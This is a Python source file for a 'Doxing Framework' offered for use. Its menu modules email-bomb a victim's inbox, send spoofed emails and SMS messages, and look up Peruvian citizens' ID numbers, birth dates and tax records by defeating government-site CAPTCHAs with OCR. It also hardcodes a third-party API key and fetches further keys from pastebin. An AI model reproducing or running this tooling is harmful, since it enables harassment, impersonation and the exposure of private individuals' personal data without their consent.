#!/usr/bin/env python
# -*- coding: UTF-8 -*-

#######################################
#                                     #
#           Doxing Framework          #
#                                     #
#  Tool made by: Sempatte             #
#  Date: 18 June, 2018                #
#  Version: 1.8                       #
#  Link: www.fuck-society.com         #
#                                     #
#######################################


import sys, os, getpass, smtplib, time, json, signal, webbrowser, argparse, platform
from ConfigParser import ConfigParser


from libs.colors import *


def ClearS():
    if os.name == "nt": os.system("cls")
    elif os.name == "posix": os.system("clear")
    else: pass


from libs.modules import CheckM, pprint
from libs.modules import DeleteCache
from libs.modules import ctrl_c
from libs.modules import Update
from libs.modules import Command_exe_v1

signal.signal(signal.SIGINT, ctrl_c)

ClearS()

# posix: Linux
# nt: Windows

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--developer", help="Developer executes as way", action="store_true")
args = parser.parse_args()


from io import *
from libs.view import *

if args.developer:
    # noinspection PyUnresolvedReferences
    import pycurl, urllib, lxml, requests, request, pytesseract, sys
    from pytesseract import TesseractError
    from urllib2 import urlopen
    import urllib2
    from bs4 import BeautifulSoup
    from PIL import Image


#LOAD MODULES
else:
    print Yellow + "\n [!]::[Check Dependencies]: \n"

    def connected(host='http://google.com'):
        # noinspection PyBroadException
        try:
            urlopen(host)
            return True
        except:
            return False

    if connected():
        openipv4 = urlopen('http://ipv4.wtfismyip.com/text')
        ip = openipv4.read()
        op_sys = sys.platform.replace('win32', 'Windows').replace('cygwin', 'Windows')

        if os.name == 'nt': check = "Y"
        elif os.name == 'posix': check = "✓"

        print ' [' + Green + check + Yellow + ']::[Connectivity to Internet]:' + Green + ' YES!' + Yellow
        print ' [' + Green + check + Yellow + ']::[DISTRO/O.S]: ' + Green + op_sys + Yellow

    else:
        if os.name == 'nt': _no = "N"
        elif os.name == 'posix': _no = "✘"

        print ' [' + Red + _no + Yellow + ']::[Connectivity to Internet]:' + Red + ' NO!' + Yellow
        print Red + "\n [!] Please check your Internet Connectivity. " + White
        exit(1)

    # noinspection PyBroadException

    try:
        import selenium
        pprint(Module_E="selenium")
    except ImportError:
        CheckM(Module="selenium")

    try:
        import pycurl
        pprint(Module_E="pycurl")
    except ImportError:
        CheckM(Module="pycurl")

    try:
        import pytesseract
        pprint(Module_E="pytesseract")
    except ImportError:
        CheckM(Module="pytesseract")

    try:
        import urllib
        pprint(Module_E="urllib")
    except ImportError:
        CheckM(Module="urllib")

    try:
        import urllib2
        from urllib2 import urlopen
        pprint(Module_E="urllib2")
    except ImportError:
        CheckM(Module="urllib2")

    try:
        import lxml
        pprint(Module_E="lxml")
    except ImportError:
        CheckM(Module="lxml")

    try:
        from bs4 import BeautifulSoup
        pprint(Module_E="bs4")
    except ImportError:
        CheckM(Module="bs4")

    try:
        import requests
        pprint(Module_E="requests")
    except ImportError:
        CheckM(Module="requests")




    time.sleep(.900)
    ClearS()

    if os.name == "nt":
        os.system('color f')
        print White
    else:
        pass

Banner()
Menu()
Help()

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import ElementNotInteractableException

from PIL import Image

##############################  D        F         M  ###################################
dfm = Yellow + '[' + Red + 'd' + White + 'f' + Red + 'm' + Yellow + ']' + White + ': '
#########################################################################################


config = ConfigParser() 
config.read('config.ini')

Continue = False

while Continue == False:

    if config.get("DEFAULT", "installed_tesseract") == 'Y':
        Continue = True
    else:

        YN = White + "\n[?]" + Red + " Have you installed Tesseract? (Y/N): "
        C1 = raw_input(YN)
        C1 = C1.lower()

        if C1 == 'y':
            set_path = raw_input(Red + "[?] " + White  + "Insert the PATH where Tesseract is installed. If you press 'ENTER' it will automatically set 'C:/Program Files (x86)/Tesseract-OCR/tesseract.exe': ")
                
            if set_path == '': config.set("PATH", "C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe")

            
            elif 'tesseract.exe' not in set_path:
                print Red + "[!] " + White + "Please, insert a valid path."
                exit(1)
            
            else: config.set("PATH", "tesseract_path", set_path)

            config.set('DEFAULT', 'installed_tesseract', 'Y')

            with open('config.ini', 'wb') as configfile: config.write(configfile)

            Continue = True
        
        elif C1 == 'n':
            config.set('DEFAULT', 'installed_tesseract', 'N')

            print Red + "\n[!] " + White + "You need install Tesseract OCR to use DoxingFramework."
            #webbrowser.open_new("https://github.com/UB-Mannheim/tesseract/wiki")
            CCC = raw_input(Red + "\n[?] " + White + "Do you want download the archive? (Y/N): ")

            platform_win = platform.architecture()
            platform_win = platform_win[0]
            if CCC == 'N':
                exit(1)
            else:
                if '64' in platform_win:
                    url = "https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w64-setup-v4.0.0.20181030.exe"
                else:
                    url = "https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-w32-setup-v4.0.0.20181030.exe"

                file_name = url.split('/')[-1]
                u = urllib2.urlopen(url)
                f = open(file_name, 'wb')
                meta = u.info()
                file_size = int(meta.getheaders("Content-Length")[0])
                print "\nDownloading: %s Bytes: %s" % (file_name, file_size)

                file_size_dl = 0
                block_sz = 8192
                while True:

                    buffer = u.read(block_sz)
                    if not buffer: break

                    file_size_dl += len(buffer)
                    f.write(buffer)
                    status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
                    status = status + chr(8)*(len(status)+1)
                    print status,

                f.close()
                print "\n"
                os.system('tesseract-ocr-w64-setup-v4.0.0.20181030.exe')

                if '64' in platform_win: os.system("del /F /Q tesseract-ocr-w64-setup-v4.0.0.20181030.exe")
                else: os.system("del /F /Q tesseract-ocr-w32-setup-v4.0.0.20181030.exe")
                
                continue

            with open('config.ini', 'wb') as configfile: config.write(configfile)


        else:
            Continue = False


while True:

    print White
    choice = raw_input(dfm)
    print White
    choice = choice.lower()

    u = 'use '
    O_1 = u+'pys/email_bomb' #Opcion uno (Email bomb)
    O_2 = u+'dox/find_dni'   #Opcion dos (Find dni)
    O_3 = u+'dox/found_op'   #Opcion tres (Found carrier)
    O_4 = u+'dox/whois'      #Opcion cuatro (WHOIS IP)
    O_5 = u+'dox/ve_email'   #Opcion cinco (Verifica el eMail si existe)
    O_6 = u+'pys/send_sms'   #Opcion seis (Enviar mensajes SMS)
    O_7 = u+'pys/fake_email' #Opcion siete (Enviar correo fake)
    O_8 = u+'dox/sunat_info' #Opcion ocho (Buscar por RUC o NOMBRES en la base de datos de la SUNAT)

    if choice == O_1:
        print Purple + "\n[#] Use" + Red +' back ' + Purple + "to back to menu."
        print White
        server = raw_input("[+] Mail server: Gmail o Hotmail/Outlook: ")
        server = server.lower()


        if server == 'outlook':
            server = 'hotmail'
        #Permitir1
        print Green
        advr = "\n[!] in order to use the '{}' mailserver correctly you must allow access\n\n".format(server)
        if server == 'gmail':
            print advr
            print "Forum: https://support.google.com/a/answer/6260879?hl=es"
            print "Direct link: https://myaccount.google.com/u/0/security?hl=es#connectedapps\n"
            webbrowser.open_new("https://myaccount.google.com/u/0/security?hl=es#connectedapps")
            print Yellow + "[SWITCH] To allow the access of sure applications: " + Red + "YES"
            pass
        elif server == 'hotmail':
            print advr
            print "Direct link: https://outlook.live.com/owa/?path=/options/popandimap\n"
            webbrowser.open_new("https://outlook.live.com/owa/?path=/options/popandimap")
            print Yellow + "[SWITCH] To allow that the devices and the applications should use POP: " + Red + "YES"
            print Yellow + "[SWITCH] It is possible to establish that the devices and the applications that they use POP eliminate Outlook's messages after unloading them. " + Red + "YES"
            pass
        elif server == 'back':
            continue
        elif server == '':
            continue
        else:
            print "[!] Select a correct server.\n"
            continue

        print White
        #Correo atacante
        M_FTA = "Mail from the attacker: "
        user = str(raw_input('[+] '+ M_FTA))

        confirm = raw_input('\n[?] Confirm? Y/N: ')
        confirm = confirm.lower()

        if confirm == 'N':
            user = str(raw_input('\n[REPET] ' + M_FTA))
        else:
            pass


        cda = '\n[SET] ' + M_FTA + '{}'.format(user)
        print Green + cda
        print White
        password = getpass.getpass('[+] Attacker password: ')

        #Correo victima
        to = raw_input('\n[+] Victima: ')
        vct = "[SET] Victim's Mail: {}".format(to)

        C = '\n[?] Confirm? Y/N: '
        confirm_two = raw_input(C)
        print White
        confirm_two = confirm_two.lower()

        if confirm_two == 'N':
            vct = str(raw_input("\n[REPET] Victim's Mail: "))
        else:
            print Green + vct



        #Mensaje
        print White
        body = raw_input('[+] Message to send: ')

        #Nº
        try:
            numero = int(raw_input('\n[+] Number of times to send:'))
        except ValueError:
            print "[!] Please place only numbers"
            continue
        nmr = '\n[SET] N: {}'.format(numero)

        print Green + nmr

        #Confirmar proceso
        print Red
        cfr_dos = raw_input("n[?] Are you sure you want to continue? Y/N: ")
        print White
        if cfr_dos == 'N':
            continue
        else:
            pass


        if server == 'gmail':
            smtp_server = 'smtp.gmail.com'
            port = 587
        elif server == 'hotmail':
            smtp_server = 'smtp-mail.outlook.com'
            port = 587
        else:
            print '[-] Mail server wrong, try again.'
            continue

        try:

            server = smtplib.SMTP(smtp_server,port)
            server.ehlo()
            if smtp_server == 'smtp.gmail.com':
                server.starttls()
            elif smtp_server == 'smtp-mail.outlook.com':
                server.starttls()

            server.login(user,password)


            for i in range(1, numero+1):
                subject = os.urandom(9)

                server.sendmail(user,to,body)
                sends = "\rE-mails sent: [%i]" % i
                print sends
                sys.stdout.flush()
            server.quit()
            print "\n[!] Done with success!\n"
        except KeyboardInterrupt:
            print "[Ctrl+C] Canceled by user."
            exit(1)
        except smtplib.SMTPAuthenticationError:
            print '\n[!] The user/email or password introduced from the attacker are wrong. Try it again.'
            continue
        except smtplib.SMTPServerDisconnected:
            print '\n[!] The server was disconnected by an unknown error. Try it again.'
            continue
        except smtplib.SMTPConnectError:
            print '\n[!] An Error occurred while trying to connect to the server. Check your connection.'
            continue

    elif choice == O_2:
        dfm_1 = Yellow + '[' + Red + 'd' + White + 'f' + Red + 'm' + Yellow + "::" + Green +"dox/find_dni" + Yellow + "]" + White +"~$"
        tesseract_path =  config.get("PATH", "tesseract_path")
        pytesseract.pytesseract.tesseract_cmd = tesseract_path

        print Purple + "\n[#] Use" + Red + ' back ' + Purple + "to back to menu."
        print White

        def FindDNI(ape_pat_, ape_mat_, n1_, n2_):
            page = 'http://ww4.essalud.gob.pe:7777/acredita/index.jsp'
            args1 = ["hide_console", ]
            service = webdriver.chrome.service.Service(os.path.abspath("libs\chromedriver\chromedriver.exe"), service_args=args1)
            service.start()


            chrome_options = Options()

            chrome_options.add_argument("--headless")


            driver = webdriver.Remote(service.service_url, desired_capabilities=chrome_options.to_capabilities())
            captcha_re = False

            while captcha_re == False:
                driver.get(page)

                slect = driver.find_element_by_id('BuscarPor')

                for option in slect.find_elements_by_tag_name('option'):
                    if option.text == 'Datos Personales':
                        option.click()
                        break

                # noinspection PyBroadException
                try:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "ap")))
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "am")))
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "n1")))
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "n2")))

                except:
                    print Red + "\n [!] Please check your Internet Connectivity. " + White
                    continue

                driver.find_element_by_name("ap").send_keys(ape_pat_)
                driver.find_element_by_name("am").send_keys(ape_mat_)
                driver.find_element_by_name("n1").send_keys(n1_)
                driver.find_element_by_name("n2").send_keys(n2_)

                driver.save_screenshot("tmp/doxfm/screenshot.png")
                img = Image.open('tmp/doxfm/screenshot.png')
                img_recortada = img.crop((560, 343, 677, 378))  # Prueba
                img_recortada.save("tmp/doxfm/_recorte.png")

                captcha = pytesseract.image_to_string('tmp/doxfm/_recorte.png')[0:5]
                #print captcha #TEST

                if captcha == '' or len(captcha) != 5:
                    captcha_re = False
                else:
                    captcha_re = True

            codigo = driver.find_element_by_name("captchafield_nom")
            codigo.send_keys(captcha)
            driver.find_element_by_name('submit').click()

            page = driver.page_source

            file_ = open('tmp/doxfm/page.html', 'w')
            file_.write(page)
            file_.close()

            driver.close()
            driver.quit()

        ape_pat = raw_input(dfm_1 + Cyan + 'INSERT THE PATERNAL SURNAME: ' + White)

        if ape_pat == '':
            print Red + "[!] " + White + "The paternal surname is needed"
            continue
        elif ape_pat == 'back': continue

        ape_mat = raw_input(dfm_1 + Cyan + 'INSERT THE MATERNAL SURNAME: '+ White)

        if ape_mat == '':
            print Red + "[!] " + White + "The maternal surname is needed"
            continue
        elif ape_mat == 'back': continue

        n1 = raw_input(dfm_1 + Cyan + 'INSERT THE FIRST NAME: '+ White)

        if n1 == '':
            print Red + "[!] " + White + "The first name is needed"
            continue
        elif n1 == 'back': continue

        n2 = raw_input(dfm_1 + Cyan + 'INSERT THE SECOND NAME: '+ White)
        
        if n2 == 'back': continue


        AlertText = True
        while AlertText == True:
            # noinspection PyBroadException
            try:
                FindDNI(ape_pat, ape_mat, n1, n2)
                AlertText = False
            except:
                AlertText = True


        f = open('tmp/doxfm/page.html', 'r')
        datos = f.read()
        soup = BeautifulSoup(datos, 'lxml')
        # noinspection PyBroadException
        try:
            Nombres = soup.find("input", attrs={"name": "nom"})['value']
            DNI = soup.find("input", attrs={"name": "ndoc"})['value']

            F_Nacimiento = soup.find("input", attrs={"name": "auto"})['value']
            F_Nacimiento1 = F_Nacimiento[0:2]
            F_Nacimiento2 = F_Nacimiento[2:4]
            F_Nacimiento3 = F_Nacimiento[4:6]
        except:
            Nombres = 'Not found.'
            DNI = '00000000'
            F_Nacimiento1, F_Nacimiento2, F_Nacimiento3 =  "00", "00", "00"



        print Green + '\n[#]Nombres: '
        print Cyan + '       ' + Nombres + '\n'
        print Green + '[#]DNI: '
        print Cyan + '       ' + DNI + '\n'
        print Green + '[#]Fecha de nacimiento: '
        print Cyan + '       ' + F_Nacimiento3 + "/" + F_Nacimiento2 + "/" + F_Nacimiento1 + '\n'

        f.close()

        Command_exe_v1("del /F /Q tmp\doxfm\_recorte.png && del /F /Q tmp\doxfm\screenshot.png && del /F /Q tmp\doxfm\page.html", "rm _recorte.png && rm screenshot.png && rm page.html")
        pass

    elif choice == O_3:
        dfm_2 = Yellow + '[' + Red + 'd' + White + 'f' + Red + 'm' + Yellow + "::" + Green +"dox/found_op" + Yellow + "]" + White +"~$"
        print Purple + "\n[~] Leave blank to back the menu."
        print White

        try:
            access_key = '7ffd7b8e4cd47b7f818dc55be7505fd8'
            sys.stdout.write(dfm_2 + Cyan +"INSERT THE PREFIX AND THE NUMBER: +" + White)
            sys.stdout.flush()
            number = raw_input()

            if number == '':
                continue
            else:
                pass

            url = 'http://apilayer.net/api/validate?access_key={}&number={}&country_code=&format=1.json'.format(access_key, number)

            r = urlopen(url)
            text = r.read()

            f = open(number+'.json','a')
            f.write(text.decode('utf-8'))
            f.close()


            def cargar_datos(rutacon_2):
                with open(rutacon_2) as contenido:
                    number_a = json.load(contenido)
                    A = json.dumps(number_a, indent=4, sort_keys=True).replace('{', '').replace('}', '').replace('"', '').replace('_', ' ').replace(',', '').replace('    ', '[+] ')
                    print Green
                    if 'valid: false' in A:
                        print "[!] Wrong number"
                    elif 'valid: true' in A:
                        print A.upper()
                    elif 'code: 211' or 'success: false' in A:
                        print "[!] Place only numbers"
                    else:
                        print A.upper()

            rutacon = number + ".json"
            cargar_datos(rutacon)

            Command_exe_v1("del /F /Q " + rutacon, "rm" + rutacon)


        except ValueError :
            Command_exe_v1("del /F /Q " + rutacon, "rm" + rutacon)

    elif choice == O_4:

        print Purple
        print "[~] Use" + Red + ' clear ' + Purple + "to clear the console."
        print Purple + "[~] Use" + Red + ' back ' + Purple + "to back to menu."
        print White
        openipv4 = urlopen('http://ipv4.wtfismyip.com/text')
        ip = openipv4.read()

        print 'Your IP: {}'.format(ip)
        __ip = raw_input('[#] Insert IP: ')

        if __ip == 'back': continue
        else: pass

        url = 'http://extreme-ip-lookup.com/json/{}'.format(__ip)

        # noinspection PyBroadException

        try:
            r = urlopen(url)
            text = r.read()
        except:
            print Red + "\n[!] Invalid IP \n"
            print White
            continue

        f = open(__ip + '.json', 'a')
        f.write(text.decode('utf-8'))
        f.close()


        def cargar_datos_2(ruta_2):

            with open(ruta_2) as contenido:

                w_ip = json.load(contenido)
                A = json.dumps(w_ip, indent=4, sort_keys=True)
                A = A.upper()
                print Green
                Line = '-------------------------------------------------------------------------------------------------------------------------------'
                print Yellow + '\n' + Line
                dates_ip = A.replace('{', '').replace('}', '').replace('"', '').replace('    ', Green + '[+] ' + Yellow).replace('_', ' ').replace(',', '')

                dates_ip = dates_ip.replace('CITY: ', White + 'CITY: ' + Yellow)
                dates_ip = dates_ip.replace('BUSINESSNAME: ', White + 'BUSINESSNAME: ' + Yellow)
                dates_ip = dates_ip.replace('BUSINESSWEBSITE: ', White + 'BUSINESSWEBSITE: ' + Yellow)
                dates_ip = dates_ip.replace('CONTINENT: ', White + 'CONTINENT: ' + Yellow)
                dates_ip = dates_ip.replace('COUNTRY: ', White + 'COUNTRY: ' + Yellow)
                dates_ip = dates_ip.replace('COUNTRYCODE: ', White + 'COUNTRYCODE: ' + Yellow)
                dates_ip = dates_ip.replace('IPNAME: ', White + 'IPNAME: ' + Yellow)
                dates_ip = dates_ip.replace('IPTYPE: ', White + 'IPTYPE: ' + Yellow)
                dates_ip = dates_ip.replace('ISP: ', White + 'ISP: ' + Yellow)
                dates_ip = dates_ip.replace('LAT: ', White + 'LAT: ' + Yellow)
                dates_ip = dates_ip.replace('LON: ', White + 'LON: ' + Yellow)
                dates_ip = dates_ip.replace('ORG: ', White + 'ORG: ' + Yellow)
                dates_ip = dates_ip.replace('QUERY: ', White + 'QUERY: ' + Yellow)
                dates_ip = dates_ip.replace('REGION: ', White + 'REGION: ' + Yellow)
                dates_ip = dates_ip.replace('STATUS: ', White + 'STATUS: ' + Yellow)


                if "QUERY IS NOT A VALID IP ADDRESS" in dates_ip:
                    print Red + "\n[!] Invalid IP \n"
                else:
                    print dates_ip
                    pass

                print Yellow + Line + '\n'

                print White


        try:

            ruta = __ip + ".json"
            cargar_datos_2(ruta)
            Command_exe_v1("del /F /Q " + ruta, "rm " + ruta)

        except ValueError:
            Command_exe_v1("del /F /Q " + ruta, "rm " + ruta)

    elif choice == O_5:
        print Purple + "\n\n[~] Leave blank to back the menu."
        print White
        sys.stdout.write("[#] Insert the eMail: ")
        sys.stdout.flush()
        e_Mail = raw_input()

        if '@' in e_Mail:
            pass
        elif e_Mail == '':
            continue
        else:
            print Red + "\n[!] eMail Invalid! " + White
            continue
        url_3 = 'http://api.2ip.me/email.txt?email={}'.format(e_Mail)

        # noinspection PyBroadException
        try:
            OP = urlopen(url_3)
            VW = OP.read()
            if 'true' in VW:
                print Green + "\n[+] This email " + Yellow + e_Mail + Green + " if it exists\n"
            elif 'false' in VW:
                print Red + "\n[+] This email "  + Yellow + e_Mail + Red + " does not exist\n"
            else:
                print Red + "\n[!] Limit of returned objects has been reached. Please change your IP \n"
        except:
            print Red + '\n[!] Check your internet conectivity'

    elif choice == O_6:

        def sendSMS(API_key_a, API_key_b, API_key_c, victim, message_to):
            url_sms = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_a, victim, message_to)
            openurl = urlopen(url_sms)
            readurl = openurl.read()
            try:
                if "Invalid number" in readurl:
                    print "\n[!] Invalid number"

                elif "Insufficient credits" in readurl or "Invalid login details" in readurl:
                    url_b = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_b, victim, message_to)
                    openurl_b = urlopen(url_b)
                    readurl_b = openurl_b.read()
                    if "Insufficient credits" in readurl_b or "Invalid login details" in readurl_b:
                        url_c = 'http://api.txtlocal.com/send/?apikey={}&numbers={}&message={}&sender=AAA'.format(API_key_c, victim, message_to)
                        openurl_c = urlopen(url_c)
                        readurl_c = openurl_c.read()
                        if "Insufficient credits" in readurl_c or "Invalid login details" in readurl_c:
                            print Red + "\n[!] Please contact the depelover: sempatte@protonmail.com"
                        elif "success" in readurl_c:
                            print Green + "\n[A3#] Sended!"
                        else:
                            pass
                    elif "success" in readurl_b:
                        print Green + "\n[A2#] Sended!"
                    else:
                        pass
                elif "success" in readurl:
                    print Green + "\n[A1#] Sended!"
                else:
                    pass
            except urllib2.HTTPError as exception:
                print Red + "[!] Do not use space in messages"

        print Purple + "\n[~] Use " + Red + "'+'" + Purple + " instead of space" + White + " Ex: Hello+World+:)"
        print Purple + "[~] Use" + Red +' back ' + Purple + "to back to menu. \n"
        print White
        victim_number = raw_input('[+]Insert the number: +')

        if victim_number == 'back':
            continue
        else:
            pass

        message_sms = raw_input('[+]Insert the message: ')

        if message_sms == 'back':
            continue
        else:
            pass

        ######################### 1 ##########################
        openurl_key_1 = urlopen('http://pastebin.com/raw/8q7kEZ8U') #b00tn0001@gmail.com
        key_1 = openurl_key_1.read()

        ######################### 2 ##########################
        openurl_key_2 = urlopen('http://pastebin.com/raw/sEY9mSZ8') #kayzen.srihan@two0aks.com
        key_2 = openurl_key_2.read()

        ######################### 2 ##########################
        openurl_key_3 = urlopen('http://pastebin.com/raw/zRRjPpxQ') #b00t0004@hotmail.com
        key_3 = openurl_key_3.read()

        API_key_1 = key_1
        API_key_2 = key_2
        API_key_3 = key_3

        #Send sms
        sendSMS(API_key_1, API_key_2, API_key_3, victim_number, message_sms)

    elif choice == O_7:

        print Purple + "\n\n[~] Leave blank to back the menu."
        print Purple + "[~] Do not use domains like" + White + " facebook.com, google.com, gmail.com, etc."

        print Green
        from_name = raw_input('[#] From name: ') #Name

        if from_name == '': continue

        from_email = raw_input('[#] From email: ') #From email

        if '@' in from_email or '@' in to:
            pass
        elif from_email == '' or to == '':
            continue
        else:
            print Red + "\n[!] eMail Invalid! " + White
            continue

        to = raw_input('[#] To: ') #To email

        if to == '': continue

        subject = raw_input('[#] Subject: ') #Subjec

        if subject == '': continue

        text = raw_input('[#] Text: ') #Plain text

        if text == '': continue

        user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
        sess = requests.Session()
        email_req = sess.post('https://prevenient-sister.000webhostapp.com/admin.php', headers={
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://prevenient-sister.000webhostapp.com/admin.php',
            'Upgrade-Insecure-Requests':'1',
            'Content-Type':'application/x-www-form-urlencoded'
        }, data={
            'fromname': from_name,
            'fromemail': from_email,
            'toemail': to,
            'subject': subject,
            'textarea': text,
            'Submit': 'Send'
        })

        a = email_req.text

        f = open('dat.html', 'w')

        f.write(a.decode('utf-8'))

        if 'Email sended.' in a:
            print Yellow + "\n[#] Fake email sended."
            print White
        else:
            print Red + "[!] Email not sended."

        f.close()
        Command_exe_v1("del /F /Q dat.html", "rm dat.html")

    elif choice == O_8:

        print Purple + "\n[#] Use" + Red +' back ' + Purple + "to back to menu."
        print White

        tesseract_path =  config.get("PATH", "tesseract_path")
        pytesseract.pytesseract.tesseract_cmd = tesseract_path

        def FindRUC(nombres):
            direccion_web = "http://www.sunat.gob.pe/cl-ti-itmrconsruc/FrameCriterioBusquedaMovil.jsp"
            args1 = ["hide_console", ]
            service = webdriver.chrome.service.Service(os.path.abspath("libs\chromedriver\chromedriver.exe"), service_args=args1)

            service.start()

            chrome_options = Options()
            chrome_options.add_argument("--headless")

            driver = webdriver.Remote(service.service_url, desired_capabilities=chrome_options.to_capabilities())
            captcha_re = False


            while captcha_re == False:

                driver.get(direccion_web)
                # noinspection PyBroadException
                try:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "btnPorRazonSocial")))
                except:
                    print Red + "\n [!] Please check your Internet Connectivity. " + White
                    continue

                boton0 = driver.find_element_by_id("btnPorRazonSocial")
                boton0.click()



                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "txtRuc")))

                placa = driver.find_element_by_id("txtNombreRazonSocial")

                placa.send_keys(nombres)

                driver.save_screenshot("tmp/doxfm/screenshot.png")
                img = Image.open('tmp/doxfm/screenshot.png')
                img_recortada = img.crop((209, 256, 315, 295))  #Prueba
                img_recortada.save("tmp/doxfm/_recorte.png")

                captcha = pytesseract.image_to_string('tmp/doxfm/_recorte.png')

                if captcha == ''  or len(captcha) <= 3:
                    captcha_re = False
                else:
                    captcha_re = True

            codigo = driver.find_element_by_id("txtCodigo")
            codigo.send_keys(captcha)

            driver.find_element_by_id("btnAceptar").click() #Click en buscar

            page = driver.page_source

            driver.find_element_by_class_name("list-group").click() #Click en el nombre


            file_ = open('tmp/doxfm/page.html', 'w')
            file_.write(page)
            file_.close()

            driver.close()
            driver.quit()

        def FindNames(cadena):
            direccion_web = "http://www.sunat.gob.pe/cl-ti-itmrconsruc/FrameCriterioBusquedaMovil.jsp"
            args1 = ["hide_console", ]
            service = webdriver.chrome.service.Service(os.path.abspath("libs\chromedriver\chromedriver.exe"), service_args=args1)

            service.start()

            chrome_options = Options()
            chrome_options.add_argument("--headless")

            driver = webdriver.Remote(service.service_url, desired_capabilities=chrome_options.to_capabilities())
            captcha_re = False


            while captcha_re == False:

                driver.get(direccion_web)
                # noinspection PyBroadException
                try:
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "txtRuc")))
                except:
                    print Red + "\n [!] Please check your Internet Connectivity. " + White
                    continue

                placa = driver.find_element_by_id("txtRuc")

                placa.send_keys(cadena)

                driver.save_screenshot("tmp/doxfm/screenshot.png")
                img = Image.open('tmp/doxfm/screenshot.png')
                img_recortada = img.crop((209, 256, 315, 295))  #Prueba
                img_recortada.save("tmp/doxfm/_recorte.png")

                captcha = pytesseract.image_to_string('tmp/doxfm/_recorte.png')

                if captcha == ''  or len(captcha) <= 3:
                    captcha_re = False
                else:
                    captcha_re = True

            codigo = driver.find_element_by_id("txtCodigo")
            codigo.send_keys(captcha)
            boton = driver.find_element_by_id("btnAceptar")
            boton.click()

            page = driver.page_source

            file_ = open('tmp/doxfm/page.html', 'w')
            file_.write(page)
            file_.close()

            driver.close()
            driver.quit()

        print Green +'\n------------------------------------------------------'
        print Blue + '         Option                Description\n'
        print Yellow + ' |::|      1                 Search by NAMES'
        print          ' |::|      2                 Search by RUC'
        print Green +'------------------------------------------------------\n' + White
        a = raw_input("[CHOICE]: ")

        if a == 'back': continue

        find = False
        if a == '1':
            _names_apat = raw_input(Red + '\n[?]' + White + ' Insert paternal surname: ')

            if _names_apat == '':
                print Red + "[!] " + White + "The paternal surname is needed"
                continue

            elif _names_apat == 'back': continue

            _names_amat = raw_input(Red + '\n[?]' + White + ' Insert maternal surname: ')

            if _names_amat == '':
                print Red + "[!] " + White + "The maternal surname is needed"
                continue

            elif _names_amat == 'back': continue

            _names_n1 = raw_input(Red + '\n[?]' + White + ' Insert the first name: ')

            if _names_n1 == '':
                print Red + "[!] " + White + "The first name is needed"
                continue

            elif _names_n1 == 'back': continue

            _names_n2 = raw_input(Red + '\n[?]' + White + ' Insert the second name: ')

            if _names_n2 == 'back': continue

            _names_all = str(_names_apat + ' ' + _names_amat + ' ' + _names_n1 + ' ' + _names_n2)

            try:
                FindRUC(_names_all)
            except NoSuchElementException:
                print Red + '\n[!]' + White + ' NOMBRES ERRONEOS.'

                Command_exe_v1("del /F /Q tmp\doxfm\_recorte.png && del /F /Q tmp\doxfm\screenshot.png", "rm tmp/doxfm/_recorte.png && rm tmp/doxfm/screenshot.png")

                continue
            except pytesseract.pytesseract.TesseractNotFoundError as exception:
                print Red + '\n[!]' + White + " tesseract.exe is not installed or it's not in your path."
                continue


            while find == False:

                i = open('tmp/doxfm/page.html', 'r')
                datos = i.read()

                soup = BeautifulSoup(datos, 'lxml')

                try:
                    RUC = soup.find_all("h4", attrs={"class": "list-group-item-heading"})[0]
                    find = True
                except IndexError: #captcha ERROR
                    find = False

            RUC = str(RUC)
            RUC = RUC.replace('<h4 class="list-group-item-heading">RUC: ', '').replace('</h4>','')

            find_t = False

            while find_t == False:

                try:
                    FindNames(RUC)
                except UnboundLocalError:
                    continue

                f = open('tmp/doxfm/page.html', 'r')
                datos = f.read()

                soup = BeautifulSoup(datos, 'lxml')

                try:
                    Nombres = str(soup.find_all("h4", attrs={"class": "list-group-item-heading"})[1]).replace('<h4 class="list-group-item-heading">', '').replace("</h4>", "")
                    find_t = True
                except IndexError: #Codigo captcha incorrecto
                    find_t = False

                i.close()

        elif a == '2':
            _ruc = raw_input('\nInserte RUC: ')

            if _ruc == 'back': continue

            try:
                FindNames(_ruc)
            except UnexpectedAlertPresentException:
                print Red + '\n[!]' + White + ' RUC ERRONEO.'

                Command_exe_v1("del /F /Q tmp\doxfm\_recorte.png && del /F /Q tmp\doxfm\screenshot.png", "rm tmp/doxfm/_recorte.png && rm tmp/doxfm/screenshot.png && rm tmp/doxfm/page.html")

                continue

            while find == False:

                f = open('tmp/doxfm/page.html', 'r')
                datos = f.read()

                soup = BeautifulSoup(datos, 'lxml')

                try:
                    Nombres = str(soup.find_all("h4", attrs={"class": "list-group-item-heading"})[1]).replace('<h4 class="list-group-item-heading">', '').replace("</h4>", "")
                    find = True
                except IndexError: #Codigo captcha incorrecto
                    find = False


        else:
            print Red + "\n [!]" + White + "Please select a valid option. "
            continue
        Estado, Condicion = "None", "None"

        Ruc = Nombres[0:11]
        Contr = str(soup.find_all("p", attrs={"class": "list-group-item-text"})[0]).replace('<p class="list-group-item-text">', '').replace('</p>','')
